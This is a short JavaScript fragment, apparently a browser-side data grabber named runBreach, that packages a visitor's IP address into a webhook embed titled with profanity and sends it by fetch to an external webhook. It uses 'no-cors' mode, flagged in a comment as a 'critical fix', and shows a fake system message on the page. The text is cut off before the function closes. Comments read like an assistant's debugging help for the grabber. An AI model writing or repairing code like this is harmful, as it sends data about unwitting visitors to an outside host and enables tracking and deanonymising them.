async function runBreach() {
    // ... (Your existing data gathering code) ...

    const payload = {
        "content": "⚠️ **FUCKED DATA**", // Added a content string for better reliability
        "embeds": [{
            "title": "FUCKED",
            "color": 15548997,
            "fields": [
                { "name": "👤 Network", "value": `IP: ${ipData.ip}`, "inline": true }
            ]
        }]
    };

    try {
        const response = await fetch(HOOK, {
            method: 'POST',
            mode: 'no-cors', // <--- CRITICAL FIX
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });
        
        console.log("LNX: Packet Sent to Webhook");
        document.getElementById('console').innerHTML = "[SYSTEM]:FUCKED.";
    } catch (error) {
        console.error("LNX ERROR:", error);
        document.getElementById('console').innerHTML = "[SYSTEM]: <span style='color:red'>FUCKED</span>";
    }
